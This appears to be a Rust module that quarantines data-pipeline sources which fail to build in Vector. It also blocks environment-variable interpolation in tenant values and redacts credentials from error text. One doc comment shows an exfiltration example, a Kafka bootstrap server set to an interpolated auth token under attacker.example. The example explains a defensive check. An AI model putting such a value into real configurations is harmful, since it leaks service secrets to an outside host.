// SPDX-License-Identifier: AGPL-3.0-or-later

//! NAN-4936: per-source isolation before a pull source reaches the live
//! Vector topology.
//!
//! # Why
//!
//! A pull source Vector cannot BUILD (an unparseable GCP credential, a token
//! endpoint refusing the key, a non-PEM Kafka CA) used to be written straight
//! into the watched `sources/configs` directory. From then on:
//!
//! * every `--watch-config` reload failed at topology build, so no later
//!   change (a parser publish, another source) ever went live;
//! * a cold Vector start refused the whole config, so a restart was a full
//!   ingest outage;
//! * a failed reload that ALSO re-wires an unchanged upstream (a parser publish
//!   moves `db_parsers_combined` off `prepare_output`) trips a Vector bug in the
//!   rollback path and panics the process: `Replacing unknown sink from fanout:
//!   db_parsers_combined`. See "The Vector rollback bug" below.
//!
//! The rule this module enforces: nano never puts a source into the live
//! topology unless that source builds ON ITS OWN. A source that does not is
//! quarantined — kept out of the topology, recorded as a failed deployment with
//! Vector's reason — and the rest of the config stays live.
//!
//! # Two layers
//!
//! 1. [`preflight`] — in-process, always on, no Vector needed. Mirrors the
//!    build-time parsing the pinned Vector fork does for credential material
//!    (the NAN-4935 GCP credential shapes, PEM CA files). Catches the structural
//!    class in every topology, including the open-edition compose where the api
//!    has no docker CLI.
//! 2. [`IsolationRunner`] — asks the REAL pinned Vector to build the rendered
//!    source in isolation (`vector validate --skip-healthchecks` on the source
//!    file plus a stub blackhole sink). This is the only layer that catches
//!    failures needing the component's own build: a revoked key the token
//!    endpoint refuses, an `authorized_user` refresh token Google rejects, a
//!    region the SDK cannot resolve. It talks to a small responder loop in the
//!    Vector container over a dedicated validation volume
//!    (`config/vector/.nano/vector-entrypoint.sh`), so it needs neither a docker
//!    CLI in the api nor a vector binary in the api image. The responder builds
//!    candidates with an EMPTY environment and no env interpolation: a
//!    tenant-controlled `${SECRET}` stays literal (codex P1). Tenant values are
//!    also rejected at the API ([`reject_env_interpolation`]) and escaped when
//!    rendered ([`escape_env_interpolation`]).
//!
//! The same entrypoint runs a cold-start guard: a deployed source that no longer
//! builds (a credential revoked outside nano) is replaced by an inert stand-in
//! before Vector starts, so it cannot refuse the whole config; the API reads the
//! reason from `dynamic/quarantine/` and shows the source as quarantined. When the responder is absent
//!    (older compose file, Kubernetes with S3-synced config) layer 1 still
//!    applies and the post-activation check in the deploy path is the backstop.
//!
//! # The Vector rollback bug
//!
//! `src/topology/running.rs` (nano-rs/vector, branch nano/v0.61):
//! `remove_inputs` (during `shutdown_diff` of the NEW config) sends
//! `ControlMessage::Remove` to an unchanged upstream's fanout when the new
//! config drops that upstream from a changed component's inputs ("case 3").
//! If `build_pieces` then fails, the rollback calls `connect_diff` on the
//! flipped diff, and `setup_inputs` computes `old_inputs` from `self.config`
//! (still the OLD config) — so the dropped upstream is in both sets, is not
//! "to add", and gets `ControlMessage::Replace`. The fanout no longer has that
//! sink and panics in `Fanout::replace` (`lib/vector-core/src/fanout.rs`). The
//! panic surfaces lazily, when the next event flows through the upstream.
//! Fork fix (NAN-4936, nano-rs/vector#22, in 0.61.0-nano.4): the topology
//! records which inputs `remove_inputs` actually paused and sends `Replace`
//! only for those (`Add` otherwise). nano still never delivers a config that
//! fails to build: isolation keeps reloads and cold starts healthy on any image.

use std::path::PathBuf;
use std::time::{Duration, SystemTime};

/// In-process build preflight for one pull source's credential material.
///
/// Returns the reason Vector would refuse to build the source, worded the way
/// an operator can act on. `Ok(())` means "nothing structural is wrong", not
/// "Vector will accept it" — see [`IsolationRunner`] for the authoritative
/// check.
pub(crate) fn preflight(config_type: &str, creds: Option<&serde_json::Value>) -> Result<(), String> {
    match config_type {
        // NAN-4935 owns the GCP shape rules (service_account, authorized_user,
        // external_account, impersonated_service_account, mirrored from the
        // pinned fork); a credential that cannot produce a credentials file is
        // refused, never deployed with ambient identity. No credential at all
        // means the metadata server, which only the real build can judge.
        "gcp_pubsub" => match creds {
            Some(payload) => crate::parsers::gcp_credentials::validate_gcp_pubsub_payload(payload)
                .map(|_| ())
                .map_err(|reason| format!("Invalid GCP credentials: {reason}")),
            None => Ok(()),
        },
        "kafka" => {
            let ca = creds
                .and_then(|c| c.get("tls_ca_cert"))
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if !ca.trim().is_empty() && !ca.contains("-----BEGIN CERTIFICATE-----") {
                return Err(
                    "Kafka TLS CA certificate is not a PEM certificate (expected \
                     \"-----BEGIN CERTIFICATE-----\"); librdkafka refuses to build the consumer"
                        .to_string(),
                );
            }
            Ok(())
        }
        _ => Ok(()),
    }
}

/// NAN-4936 (codex P1): Vector environment-interpolation syntax in a tenant
/// value. The live Vector expands it against its own environment
/// (`VECTOR_AUTH_TOKEN`, `CLICKHOUSE_PASSWORD`, ...): a Kafka
/// `bootstrap_servers = "${VECTOR_AUTH_TOKEN}.attacker.example:9092"` would be
/// sent to the attacker's DNS. Shared with the parser renderer (NAN-4953), see
/// [`crate::vector_env`].
pub(crate) use crate::vector_env::contains_env_interpolation;
#[cfg(test)]
pub(crate) use crate::vector_env::ENV_ESCAPED_HEADER;

/// Reject interpolation syntax in every string scalar of a tenant-supplied JSON
/// value (connection_config and similar), naming the offending path.
pub(crate) fn reject_env_interpolation(value: &serde_json::Value, path: &str) -> Result<(), String> {
    match value {
        // Azure Event Hubs' reserved consumer group name. Rendering escapes it
        // (`$$Default`), so it reaches Vector as the literal `$Default`.
        serde_json::Value::String(s) if s == "$Default" => Ok(()),
        serde_json::Value::String(s) if contains_env_interpolation(s) => Err(format!(
            "{path} must not contain environment-variable syntax (`${{...}}` or `$NAME`); \
             Vector would expand it against its own environment"
        )),
        serde_json::Value::Array(items) => items
            .iter()
            .enumerate()
            .try_for_each(|(i, v)| reject_env_interpolation(v, &format!("{path}[{i}]"))),
        serde_json::Value::Object(map) => map
            .iter()
            .try_for_each(|(k, v)| reject_env_interpolation(v, &format!("{path}.{k}"))),
        _ => Ok(()),
    }
}

/// Make a rendered source-configuration file inert to Vector's environment
/// interpolation (header + every `$` doubled, see [`crate::vector_env`]).
/// nano's own generated parts of these files contain no `$`, so only tenant
/// values (including credential values such as a Kafka SASL password, which
/// cannot be rejected) are affected. The Vector entrypoint migrates a file
/// without the header (rendered before NAN-4936) before Vector starts.
pub(crate) fn escape_env_interpolation(rendered: &str) -> String {
    crate::vector_env::escape_file(rendered)
}

/// Name of the stub sink that consumes the source under isolation.
pub(crate) const ISOLATION_SINK: &str = "nano_isolation_sink";

/// Heartbeat file the Vector-container responder rewrites every 30 seconds.
const RESPONDER_HEARTBEAT: &str = ".responder";

/// A responder whose heartbeat is older than this is treated as absent.
const RESPONDER_STALE_AFTER: Duration = Duration::from_secs(95);

/// Upper bound on one isolated validation (the responder itself bounds
/// `vector validate` at 90s with `timeout`).
const DEFAULT_ISOLATION_TIMEOUT: Duration = Duration::from_secs(100);

/// Outcome of asking the pinned Vector to build a source on its own.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum IsolationOutcome {
    /// Vector built every component.
    Passed,
    /// Vector refused; the payload is its own explanation, trimmed.
    Failed(String),
    /// The responder never answered (it heartbeated, then stalled). No
    /// evidence either way.
    TimedOut,
}

/// Where the api writes isolation requests (host path) and where the Vector
/// container sees them. Configured, never derived: the directory must NOT be
/// under any of Vector's `--config-dir`s, because Vector watches those
/// RECURSIVELY — every write there (a heartbeat, a request, a candidate
/// credential) triggers a topology reload. Measured: a `validation/` dir
/// inside the dynamic config volume reloaded Vector on 3 of 4 writes, and the
/// per-second heartbeat kept it reloading continuously.
const VALIDATION_DIR_ENV: &str = "VECTOR_VALIDATION_DIR";
const VALIDATION_RUNTIME_ENV: &str = "VECTOR_VALIDATION_RUNTIME_PATH";
const DEFAULT_VALIDATION_RUNTIME: &str = "/var/lib/nano-validation";

/// Client for the file-based validation responder running inside the Vector
/// container.
///
/// Protocol (under `VECTOR_VALIDATION_DIR`, a volume shared with the Vector
/// container at `VECTOR_VALIDATION_RUNTIME_PATH`, outside its config dirs):
///
/// * the responder rewrites `.responder` every 30 seconds (liveness);
/// * the api creates `<id>/`, renders the candidate's credential files into it
///   and its config into `<id>/config/*.toml`, then atomically creates
///   `<id>/request`;
/// * the responder runs `vector validate --skip-healthchecks` on
///   `<id>/config`, writes the combined output to `<id>/output` and the exit
///   code to `<id>/result` (atomically, via rename);
/// * the api reads both and removes `<id>/`.
pub(crate) struct IsolationRunner {
    root: PathBuf,
    runtime_root: String,
    timeout: Duration,
}

/// One isolation request directory, created before the candidate is rendered
/// so its credential files can live inside it.
pub(crate) struct IsolationRequest {
    pub(crate) host_dir: PathBuf,
    pub(crate) runtime_dir: String,
}

impl IsolationRunner {
    /// `None` when no validation volume is configured (the Vector-backed layer
    /// is then off and only the in-process preflight runs), or when
    /// `VECTOR_SOURCE_ISOLATION=off`.
    pub(crate) fn from_env() -> Option<Self> {
        if matches!(
            std::env::var("VECTOR_SOURCE_ISOLATION").as_deref(),
            Ok("off") | Ok("false") | Ok("0")
        ) {
            return None;
        }
        let root = std::env::var(VALIDATION_DIR_ENV).ok().filter(|v| !v.trim().is_empty())?;
        let runtime_root = std::env::var(VALIDATION_RUNTIME_ENV)
            .ok()
            .filter(|v| !v.trim().is_empty())
            .unwrap_or_else(|| DEFAULT_VALIDATION_RUNTIME.to_string());
        Some(Self::new(PathBuf::from(root), runtime_root))
    }

    pub(crate) fn new(root: PathBuf, runtime_root: String) -> Self {
        Self {
            root,
            runtime_root: runtime_root.trim_end_matches('/').to_string(),
            timeout: DEFAULT_ISOLATION_TIMEOUT,
        }
    }

    /// Is a responder heartbeating on the validation volume?
    pub(crate) async fn available(&self) -> bool {
        let Ok(meta) = tokio::fs::metadata(self.root.join(RESPONDER_HEARTBEAT)).await else {
            return false;
        };
        let Ok(modified) = meta.modified() else {
            return false;
        };
        match SystemTime::now().duration_since(modified) {
            Ok(age) => age <= RESPONDER_STALE_AFTER,
            // mtime in the future: clock skew between host and container. A
            // heartbeat exists and is recent by any reading.
            Err(_) => true,
        }
    }

    /// Create a fresh request directory.
    pub(crate) async fn prepare(&self) -> std::io::Result<IsolationRequest> {
        let id = uuid::Uuid::new_v4().simple().to_string();
        let host_dir = self.root.join(&id);
        tokio::fs::create_dir_all(host_dir.join("config")).await?;
        Ok(IsolationRequest {
            host_dir,
            runtime_dir: format!("{}/{id}", self.runtime_root),
        })
    }

    /// Remove a request directory (always call, pass or fail).
    pub(crate) async fn discard(&self, request: &IsolationRequest) {
        if let Err(error) = tokio::fs::remove_dir_all(&request.host_dir).await {
            tracing::debug!(dir = %request.host_dir.display(), %error, "could not remove isolation request dir");
        }
    }

    /// Ask the pinned Vector to build `files` (relative name -> TOML content)
    /// as a complete, standalone config.
    pub(crate) async fn submit(
        &self,
        request: &IsolationRequest,
        files: &[(String, String)],
    ) -> std::io::Result<IsolationOutcome> {
        let dir = &request.host_dir;
        let config = dir.join("config");
        for (name, content) in files {
            // Names are generated by nano, never user input; refuse anything
            // that could leave the request directory anyway.
            if name.contains('/') || name.contains("..") || !name.ends_with(".toml") {
                return Err(std::io::Error::other(format!(
                    "refusing isolation file name {name:?}"
                )));
            }
            tokio::fs::write(config.join(name), content).await?;
        }
        let tmp = dir.join(".request.tmp");
        tokio::fs::write(&tmp, b"1\n").await?;
        tokio::fs::rename(&tmp, dir.join("request")).await?;

        let deadline = tokio::time::Instant::now() + self.timeout;
        loop {
            if let Ok(code) = tokio::fs::read_to_string(dir.join("result")).await {
                let output = tokio::fs::read_to_string(dir.join("output"))
                    .await
                    .unwrap_or_default();
                return Ok(grade(code.trim(), &output));
            }
            if tokio::time::Instant::now() >= deadline {
                return Ok(IsolationOutcome::TimedOut);
            }
            tokio::time::sleep(Duration::from_millis(250)).await;
        }
    }

    /// `prepare` + `submit` + `discard`, for callers with no credential files.
    #[cfg(test)]
    pub(crate) async fn validate(
        &self,
        files: &[(String, String)],
    ) -> std::io::Result<IsolationOutcome> {
        let request = self.prepare().await?;
        let result = self.submit(&request, files).await;
        self.discard(&request).await;
        result
    }
}

/// Turn the responder's exit code and output into an outcome.
pub(crate) fn grade(code: &str, output: &str) -> IsolationOutcome {
    if code == "0" {
        return IsolationOutcome::Passed;
    }
    IsolationOutcome::Failed(vector_failure_reason(output, code))
}

/// Pull Vector's own explanation out of `vector validate` output: the lines
/// that carry an error marker, ANSI codes stripped, bounded in size. Falls back
/// to the exit code.
pub(crate) fn vector_failure_reason(output: &str, code: &str) -> String {
    let clean = strip_ansi(output);
    let mut lines: Vec<&str> = clean
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .filter(|l| {
            let lower = l.to_ascii_lowercase();
            l.starts_with('x')
                || l.starts_with('~')
                || lower.contains("error")
                || lower.contains("invalid")
                || lower.contains("failed")
        })
        // Box-drawing separators and the generic banner carry no reason.
        .filter(|l| !l.chars().all(|c| matches!(c, '-' | '~' | '=' | ' ')))
        .collect();
    lines.dedup();
    let mut reason = if lines.is_empty() {
        if code == "124" {
            "vector validate timed out building the source".to_string()
        } else {
            format!("vector validate exited with status {code}")
        }
    } else {
        lines.join("; ")
    };
    const MAX: usize = 1000;
    if reason.len() > MAX {
        let mut cut = MAX;
        while !reason.is_char_boundary(cut) {
            cut -= 1;
        }
        reason.truncate(cut);
        reason.push('…');
    }
    reason
}

/// Replace every credential string value (and its JSON-escaped spelling, for
/// key material that Vector might echo from a file) found in `reason`.
pub(crate) fn scrub_secrets(reason: &str, creds: Option<&serde_json::Value>) -> String {
    fn collect(v: &serde_json::Value, out: &mut Vec<String>) {
        match v {
            serde_json::Value::String(s) => {
                // A JSON-encoded credential (GCP key file) is scrubbed field by
                // field as well as whole.
                if let Ok(inner @ serde_json::Value::Object(_)) = serde_json::from_str(s) {
                    collect(&inner, out);
                }
                if s.trim().len() >= 6 {
                    out.push(s.clone());
                    let escaped = serde_json::Value::String(s.clone()).to_string();
                    out.push(escaped.trim_matches('"').to_string());
                }
            }
            serde_json::Value::Array(a) => a.iter().for_each(|x| collect(x, out)),
            serde_json::Value::Object(m) => m.values().for_each(|x| collect(x, out)),
            _ => {}
        }
    }
    let Some(creds) = creds else {
        return reason.to_string();
    };
    let mut needles = Vec::new();
    collect(creds, &mut needles);
    needles.sort_by_key(|n| std::cmp::Reverse(n.len()));
    needles.dedup();
    let mut out = reason.to_string();
    for needle in needles.iter().filter(|n| !n.is_empty()) {
        out = out.replace(needle.as_str(), "<redacted>");
    }
    out
}

fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' {
            if chars.peek() == Some(&'[') {
                chars.next();
                for n in chars.by_ref() {
                    if n.is_ascii_alphabetic() {
                        break;
                    }
                }
            }
            continue;
        }
        out.push(c);
    }
    out
}

/// The standalone config for one rendered pull source: its own file plus a
/// blackhole consuming its routing transform, so every component in the file
/// is reachable and gets built.
pub(crate) fn isolation_files(rendered_source_toml: &str, route_name: &str) -> Vec<(String, String)> {
    let sink = format!(
        "# NAN-4936 isolation stub: consumes the source under test.\n\
         [sinks.{ISOLATION_SINK}]\n\
         type = \"blackhole\"\n\
         inputs = [\"{route_name}\"]\n\
         print_interval_secs = 0\n"
    );
    vec![
        ("source.toml".to_string(), rendered_source_toml.to_string()),
        ("zz_isolation_sink.toml".to_string(), sink),
    ]
}

#[cfg(test)]
#[path = "isolation_tests.rs"]
mod tests;
